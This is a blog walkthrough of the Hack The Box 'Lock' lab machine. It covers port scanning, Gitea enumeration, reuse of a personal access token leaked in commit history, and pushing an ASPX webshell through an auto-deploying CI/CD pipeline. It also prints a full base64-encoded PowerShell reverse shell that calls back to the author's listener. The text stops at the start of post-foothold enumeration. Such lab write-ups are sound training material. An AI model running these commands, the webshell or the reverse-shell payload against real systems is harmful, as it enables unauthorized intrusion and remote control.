+++
title = "Lock HTB Walkthrough: Gitea PAT Leak → CI/CD RCE → ASPX Webshell → PrivEsc"
draft = false
tags = [
  "Windows", "HTB", "Hack The Box", "Easy",
  "Gitea", "CI/CD", "API", "Git History",
  "ASPX Webshell", "Reverse Shell",
  "mRemoteNG", "Credentials",
  "PDF24", "CVE-2023-49147", "SetOpLock",
  "MSI", "mimikatz", "SAM"
]
keywords = [
  "HTB Lock walkthrough", "Hack The Box Lock writeup",
  "Gitea leaked token", "Gitea commit history secret",
  "CI/CD auto-deploy RCE", "IIS ASPX webshell",
  "mRemoteNG decrypt credentials", "PDF24 MSI escalation",
  "SetOpLock privilege escalation", "dump SAM with mimikatz",
  "Windows easy box"
]
description = "Full Lock (HTB) write-up: enumerate Gitea via sitemap, recover a leaked personal access token from commit history, abuse CI/CD to deploy an ASPX webshell for RCE, harvest creds (git-credentials, mRemoteNG), and escalate privileges—ending with SAM dump and complete compromise."
author = "bloodstiller"
date = 2025-09-09
lastmod = 2025-09-10
toc = true
bold = true
next = true
+++

## Lock Hack The Box Walkthrough/Writeup: {#lock-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Lock>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

**TCP**:

```shell
#Command
nmap $box -Pn -oA TCPbasicScan

#Results
┌─(...oodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Lock/scans/nmap)───(kali@kali:pts/3)─┐
└─(18:55:50 on main)──> nmap $box -Pn -oA TCPbasicScan                                     ──(Mon,Sep01)─┘
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 18:55 BST
Nmap scan report for 10.129.234.64
Host is up (0.022s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server
```

-   **Initial thoughts**:
    -   This is pretty promising so far as it has web (80), samba (445), rdp (3389) and a mystery service ppp (3000)


#### Comprehensive Scans: {#comprehensive-scans}

```shell
#Command
sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP

#Results
┌─(...oodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Lock/scans/nmap)───(kali@kali:pts/3)─┐
└─(18:56:18 on main)──> sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP   ──(Mon,Sep01)─┘

[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 18:59 BST
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 8.32% done; ETC: 19:02 (0:03:18 remaining)
Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:03:52 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 19:02 (0:00:05 remaining)
Nmap scan report for 10.129.234.64
Host is up (0.022s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Lock - Index
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=8f6a82923293f354; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=IK1uiZDVuFhErLTWtysMC_KsGbM6MTc1Njc0OTc2NzQzMTk1ODYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 01 Sep 2025 18:02:48 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=55f95e33d224072a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=hHLTTOyYvWCaB81r1cGy01FkE386MTc1Njc0OTc2ODYwMDM5NTgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 01 Sep 2025 18:02:48 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-01T18:03:14+00:00
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-04-15T00:34:47
|_Not valid after:  2025-10-15T00:34:47
|_ssl-date: 2025-09-01T18:03:54+00:00; +1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=9/1%Time=68B5DFC5%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\
SF:x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=8
SF:f6a82923293f354;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:
SF:\x20_csrf=IK1uiZDVuFhErLTWtysMC_KsGbM6MTc1Njc0OTc2NzQzMTk1ODYwMA;\x20Pa
SF:th=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options
SF::\x20SAMEORIGIN\r\nDate:\x20Mon,\x2001\x20Sep\x202025\x2018:02:48\x20GM
SF:T\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-a
SF:uto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device-
SF:width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20cu
SF:p\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:appl
SF:ication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSI
SF:sInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdX
SF:JsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vb
SF:G9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmci
SF:LCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method
SF:\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-C
SF:ookie:\x20i_like_gitea=55f95e33d224072a;\x20Path=/;\x20HttpOnly;\x20Sam
SF:eSite=Lax\r\nSet-Cookie:\x20_csrf=hHLTTOyYvWCaB81r1cGy01FkE386MTc1Njc0O
SF:Tc2ODYwMDM5NTgwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSit
SF:e=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2001\x20Sep\x
SF:202025\x2018:02:48\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-09-01T18:03:15
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 293.26 seconds
```

-   **Findings**:
    -   This is very interesting as we can see that there is a Gitea instance which runs using Golang on port 3000. Gitea is a self hosted git instance which means there could be source code there so it's worth a look.
    -   We can also see that the system is running Windows Server 2022 and that smb 3.1 is running.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:

```shell
netexec smb $box -u 'guest' -p '' --shares
netexec smb $box -u '' -p '' --shares
```

As we can see both accounts have been disabled or locked.
![](/ox-hugo/2025-09-01-190143_.png)

-   +Note+: Even though we cannot authenticate with these we can still see the build number is +2038+ which we can use for further enumeration.


### Web `80`: {#web-80}


#### WhatWeb: {#whatweb}

Lets run [WhatWeb](https://github.com/urbanadventurer/WhatWeb) to see if I can glean some further information.

```shell
#Command
whatweb http://$box | sed 's/, /\n/g'

#Output
http://10.129.234.64 [200 OK] Bootstrap
Country[RESERVED][ZZ]
HTML5
HTTPServer[Microsoft-IIS/10.0]
IP[10.129.234.64]
Lightbox
Microsoft-IIS[10.0]
Script
Title[Lock - Index]
X-Powered-By[ASP.NET]
```

-   **Results**:
    -   As we can see it's running IIS 10 and a site called `Lightbox`.
    -   +Note+: I use `sed` to display the output across multiple lines for easier readability.


#### Enumerating Injection Points With Burpsuite: {#enumerating-injection-points-with-burpsuite}

-   **Web Enumeration via Burp Suite**:
    -   When manually enumerating a Website, always use Burp Suite. This allows you to:
    -   Record all potential injection points.
    -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.

<!--list-separator-->

-  Visiting The Site:

    If we navigate to the site we can see it's a single page site for a company called `GP` that provides document solutions. It's a single page site and when interacting with the site the buttons just work to reload the page.


#### Dirbusting The Webserver Running Using FFUF: {#dirbusting-the-webserver-running-using-ffuf}

We can perform some directory busting to see if there are any interesting directories.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -ic
```

Nothing really interesting here.
![](/ox-hugo/2025-09-01-205310_.png)
+Note+: `%5c` is just a url encoded backslash `\`


#### File Enumeration Using FFUF: {#file-enumeration-using-ffuf}

We can perform some file busting to see if there are any interesting files with the extension, `.html` we saw on the main page and in the ffuf results.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ.html -ic
```

As we can see nothing else here just the index page.
![](/ox-hugo/2025-09-01-212130_.png)


#### Subdomain Enumeration with FFUF: {#subdomain-enumeration-with-ffuf}

Let's enumerate any possible subdomains with ffuf.

```shell
ffuf -w /home/kali/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://$box -H "Host:FUZZ.$domain" -ic -fs 16054
```

No subdomains to be found.
![](/ox-hugo/2025-09-01-211233_.png)


### Gitea 3000: {#gitea-3000}

As we saw web looks to be a dead-end however we still have Gitea on 3000 to look at.

We will be repeating all of the steps we used for port 80 (web) here also as we are running a webserver.


#### WhatWeb: {#whatweb}

Lets run [WhatWeb](https://github.com/urbanadventurer/WhatWeb) to see if I can glean some further information.

```shell
#Command
whatweb http://$box:3000 | sed 's/, /\n/g'

#Output
http://10.129.234.64:3000 [200 OK] Cookies[_csrf,i_like_gitea]
Country[RESERVED][ZZ]
HTML5
HttpOnly[_csrf,i_like_gitea]
IP[10.129.234.64]
Meta-Author[Gitea - Git with a cup of tea]
Open-Graph-Protocol[website]
PoweredBy[Gitea]
Script
Title[Gitea: Git with a cup of tea]
X-Frame-Options[SAMEORIGIN]
```

-   **Results**:
    -   As we expected, Gitea is running.


#### Dirbusting The Webserver Running Using FFUF: {#dirbusting-the-webserver-running-using-ffuf}

We can perform some directory busting to see if there are any interesting directories.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box:3000/FUZZ -fs [ignoreSize] -ic
```

{{< figure src="/ox-hugo/2025-09-02-070536_.png" >}}

As we can see there is the standard "administrator" page.

What is more interesting is the `sitemap.xml` file we can see here.


#### Exploring The `sitemap.xml` Using `wget` &amp; `xmllint`: {#exploring-the-sitemap-dot-xml-using-wget-and-xmllint}

+Note+: This entire part can also be done by visiting the site in the browser, I just wanted to mix it up and just use wget and xmllint to enumerate via the sitemaps.

If run a `wget` on the file and pipe it through `xmllint` so it renders nicely we can see it provides further sitemaps for repos and users.

```sh
wget -qO-  http://$box:3000/sitemap.xml | xmllint --format -
```

![](/ox-hugo/2025-09-02-071623_.png)
As you can see it lists these as being on `localhost` so we just need to substitute the actual box ip (which I have set as the bash variable `$box`.

<!--list-separator-->

-  Exploring Users:

    ```bash
    wget -qO-  http://$box:3000/explore/users/sitemap-1.xml | xmllint --format -
    ```

    ![](/ox-hugo/2025-09-02-072001_.png)
    We can see there are two registered users `ellen.freeman` &amp; `administrator` we can add ellen to our list usernames and we also have a url we can now visit.


#### Finding A `dev-scripts` Repo By Exploring with `wget` &amp; `xmllint`: {#finding-a-dev-scripts-repo-by-exploring-with-wget-and-xmllint}

```bash
wget -qO-  http://$box:3000/explore/repos/sitemap-1.xml | xmllint --format -
```

![](/ox-hugo/2025-09-02-072427_.png)
We can see that ellen freeman as a repo called `dev-scripts`

Let's see if we can access the `dev-scripts` repo:

```bash
wget -qO-  http://$box:3000/ellen.freeman/dev-scripts | head -n 20
```

{{< figure src="/ox-hugo/2025-09-02-073047_.png" >}}

As we can see we can access it. Let's jump into the browser now to explore further.

+Note+: I am piping into head &amp; showing the first 20 lines with `-n 20` as there is no reason to dump the entire page to the console. Doing it this way allows us to see if we can access it.


### Accessing the `dev-scripts` repo: {#accessing-the-dev-scripts-repo}

{{< figure src="/ox-hugo/2025-09-02-073159_.png" >}}

Accessing the site, we can see that there is one file, two commits, and one branch.

First, let’s take a look at the file. We can do this by clicking on `repos.py`:
![](/ox-hugo/2025-09-02-073453_.png)

The file contains the Python code below. Let’s break it down so we understand what’s going on.


### Code Review of `repos.py`: {#code-review-of-repos-dot-py}

```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```


#### **Imports**: {#imports}

```python
import requests
import sys
import os
```

The script begins by importing the required modules.


#### **`format_domain` function**: {#format-domain-function}

```python
def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain
```

This function takes one argument, `domain`.
It checks whether the domain starts with `http://` or `https://`.
If not, it prepends `https://` to the domain and returns the result.


#### **`get_repositories` function**: {#get-repositories-function}

```python
def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')
```

This function takes two arguments: `token` and `domain`.
It builds a header containing the authorization token and constructs the API endpoint URL.

It then performs a GET request to the API.

-   If the response status code is `200`, it returns the JSON response.
-   Otherwise, it raises an exception with the status code.


#### **`main` function**: {#main-function}

This is the main function of the script. I’ll break it down into smaller sections.

<!--list-separator-->

-  Argument Length Check:

    ```python
    def main():
        if len(sys.argv) < 2:
            print("Usage: python script.py <gitea_domain>")
            sys.exit(1)
    ```

    The script checks whether an argument (the Gitea domain) was provided.
    If not, it prints a usage message and exits.

<!--list-separator-->

-  Set the Gitea Domain Value:

    ```python
    gitea_domain = format_domain(sys.argv[1])
    ```

    Here, the script sets the value of `gitea_domain` to the return value of `format_domain(sys.argv[1])`.

    For example:
    If the user runs `python script.py http://mygiteadomain.com`,
    the variable will be set to `http://mygiteadomain.com`.

<!--list-separator-->

-  Personal Access Token:

    ```python
    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)
    ```

    This is arguably the most interesting part of the script.

    It attempts to read the environment variable `GITEA_ACCESS_TOKEN` using `os.getenv`.
    If the variable is not set, the script prints an error and exits.

    Why is this important?

    -   Developers often store access tokens in `.env` files, which are excluded via `.gitignore`.
    -   In practice, many developers accidentally commit tokens while hardcoding them during testing.

    +Once we finish this code review, we’ll check the Git history to see if any secrets were exposed.+

<!--list-separator-->

-  Print Repository List:

    ```python
    repos = get_repositories(personal_access_token, gitea_domain)
    print("Repositories:")
    for repo in repos:
        print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")
    ```

    Finally, the script fetches the repositories by calling `get_repositories` with the domain and token.
    It then loops through the returned JSON and prints each repository’s `full_name`.


### Finding Committed Secret in Previous Commits: {#finding-committed-secret-in-previous-commits}

Now that we know what the script does let's check to see if there are any hardcoded secrets present in previous commits.

We can do this by clicking the "history" button.
![](/ox-hugo/2025-09-02-171259_.png)

In it we can see the two commits that the user `ellen` has made. Let's check the initial commit.
![](/ox-hugo/2025-09-02-171328_.png)

As we can see there is a hard-coded access token present in the commit so we can take that and check if it is still valid or if it has been revoked.
![](/ox-hugo/2025-09-02-171424_.png)

```bash
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
```


### Testing If The Access Code Is Still Valid: {#testing-if-the-access-code-is-still-valid}

An easy way for us to test if this token is still valid is to run the script with it.


#### Setting Up Python venv: {#setting-up-python-venv}

In order to keep things tidy let's setup a venv.

```bash
#Create the venv
python3 -m venv repos

#Activate the venv
source repos/bin/activate
```


#### Install Our Dependencies: {#install-our-dependencies}

```bash
pip3 install requests
```

We only have to install the requests library as `sys` &amp; `os` are part of the standard python libraries.
![](/ox-hugo/2025-09-02-172252_.png)


#### Set Our Environemental Variable: {#set-our-environemental-variable}

```bash
# Set it
export GITEA_ACCESS_TOKEN='43ce39bb0bd6bc489284f2905f033ca467a6362f'
# Check it
echo $GITEA_ACCESS_TOKEN
```

![](/ox-hugo/2025-09-02-173135_.png)
+Note+: This will only set it for the current shell/pane you are in so if you move shell/pane and want to use it again you will need to set it again.


#### Run the Script: {#run-the-script}

```bash
python3 repos.py http://10.129.234.64:3000/
```

![](/ox-hugo/2025-09-02-173247_.png)
As we can see this still works and we can make valid API calls with the token. We can also see it has access to a private repo called `website`.


### Using `GiteaProber.py` To Enumerate Further Our Token Privileges: {#using-giteaprober-dot-py-to-enumerate-further-our-token-privileges}

I decided to create a Gitea API probing tool so that I can easily check various endpoints using the API and a token. You can find that tool here: [Gitea Prober](https://github.com/bloodstiller/GiteaProber/tree/main)

We can run it with the below command.

```bash
python3 GiteaProber.py --url http://10.129.234.64:3000 --token 43ce39bb0bd6bc489284f2905f033ca467a6362f
```

As we can see from the output we get the repositories our user can access. We can also see there is a check performed to see if we can access all repositories however this requires admin privileges and is denied, letting us know this token does not have admin privileges.
![](/ox-hugo/2025-09-03-180801_.png)

This is further reinforced by the findings displayed below, we can see as expected we can make queries regarding our user with the API and get 200 response however the admin API endpoints are forbidden.
![](/ox-hugo/2025-09-03-180918_.png)


### Downloading The Website Repo: {#downloading-the-website-repo}

Let's download the private `website` repository.

We can pass the token as part of out git clone command effectively using it as a password for authorization.

```sh
git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
```

{{< figure src="/ox-hugo/2025-09-04-065840_.png" >}}


#### Discovering The Website Uses A CI/CD pipeline: {#discovering-the-website-uses-a-ci-cd-pipeline}

Reading the file `readme.md` in the main folder we can see it has the following lines.
![](/ox-hugo/2025-09-03-182155_.png)

What does this mean?

<!--list-separator-->

-  Side Quest What is CI/CD pipeline?

    A CI/CD pipeline is a system commonly used by developers to streamline the software lifecycle. The acronym stands for **C**-ontinuous **I**-ntegration and **C**-ontinuous **D**-elivery.

    In practice, this means when developers push new code to the repository, the pipeline automatically kicks in. It will usually:

    -   Runs automated tests
    -   Builds the application
    -   Deploys the updated code to the server

    From an attacker’s perspective, this has a critical implication:
    If we can edit the repository and push our own changes, the pipeline will build and deploy them on the target server, +effectively giving us remote code execution (RCE)+.


### Checking Git Log: {#checking-git-log}

When we have access to a repository it's also useful to check the history of the repository using `git log` this shows us the previous commits and commit messages. In this case the message is always (apart from the initial commit) "update" which is poor coding practices as it's not descriptive or informative.
![](/ox-hugo/2025-09-04-071201_.png)

+Tip+: I always recommend checking git log as sometimes you will see commits like "removed API key" etc and as we saw previously this user had alrady committed a key.


#### Side Quest: Checking A Previous Commit's Diff: {#side-quest-checking-a-previous-commit-s-diff}

We can easily see what was changed between commits by using the `git show` command and providing the commit hash.
![](/ox-hugo/2025-09-04-071137_.png)

```bash
#Command
git show [commit-hash]

#Example
git show 657a342b7a68f195f4
```

+Note+: We don't need the full commit hash just 6/10 characters to view the commit.
![](/ox-hugo/2025-09-04-071259_.png)
As we can see this commit just added the `readme.md`.


### Creating A POC: {#creating-a-poc}

-   **Making a Change to `index.html`**
    To ensure this is the right path we need to create a Proof of Concept (POC) we can do this by making a small change to the site and seeing if it does in fact get processed by the CI/CD pipeline and pushed live to the site.
    To do this we can edit the `index.html` to include a comment in the footer.

{{< figure src="/ox-hugo/2025-09-04-071658_.png" >}}

-   **Pushing Our Changes To The Site**:

Now we need to push our changes.

```bash
# Add our changes
git add .
# Use the same previously used commit message
git commit -m "update"
# Push our changes
```

{{< figure src="/ox-hugo/2025-09-04-073803_.png" >}}

-   **Verifying Our Changes Are Live**:

Now if we navigate to the site and inspect the page we can see our changes live on the site.
![](/ox-hugo/2025-09-04-074231_.png)


## 2. Foothold: {#2-dot-foothold}


### Pushing A Webshell To The Host For RCE: {#pushing-a-webshell-to-the-host-for-rce}

As the host is running on windows we should be able to push an aspx webshell to the host to have it run.

We can use Laudanum for this. Laudanum, is a repository of pre-built files. Luckily it's available by default on Kali &amp; Parrot at\_ `/usr/share/webshells/laudanum/aspx` or via [laudanum Git](https://github.com/jbarcia/Web-Shells/tree/master/laudanum). The repository includes injectable files for different web application languages such as `ASP`, `ASPX`, `JSP`, `PHP`, and more.

1.  **Copy The Shell To The Repo**:
    ```bash
      # Copy the file to the website repo
      cp /usr/share/webshells/laudanum/aspx/shell.aspx .
    ```
    +Note+: I put it in the `/assets/img` folder for ease.

<!--listend-->

1.  **Add our IP to the list of whitelisted IP's**
    ```bash
      vim shell.aspx
    ```
    ![](/ox-hugo/2025-09-05-081622_.png)
    +Note+: This will not work unless we do this!

<!--listend-->

1.  **Commit &amp; Push Our Changes:**
    ```bash
      git add .
      git commit -m "update"
      git push
    ```

<!--listend-->

1.  **Check if we have RCE on the host**:
    We do!
    ![](/ox-hugo/2025-09-05-081910_.png)


### Getting A Reverse Shell: {#getting-a-reverse-shell}

Web shells are great but a reverse shell is better. We can use [RevShells](https://revshells.com) for this. +Tip+: They offer a Docker file to build your own image and run it locally, I like to do this in-case I am on engagement with no internet access.

Let's use the PowerShell #3 base64 encoded webshell. I tend to find base64 encoded reverse shells play nicer when executing them via webshells.
![](/ox-hugo/2025-09-05-171540_.png)

```poweshell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAxADYAIgAsADkAOAA5ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

+Note+: Don't use this one as it has my IP and port in it.

Let's start out listener

```bash
rlwrap -cAr nc -nvlp 9898
```

We then paste the shell into the cmd/c box of Laudanum and hit enter. Shell caught.
![](/ox-hugo/2025-09-05-171737_.png)


### Enumerating As Ellen.Freeman: {#enumerating-as-ellen-dot-freeman}

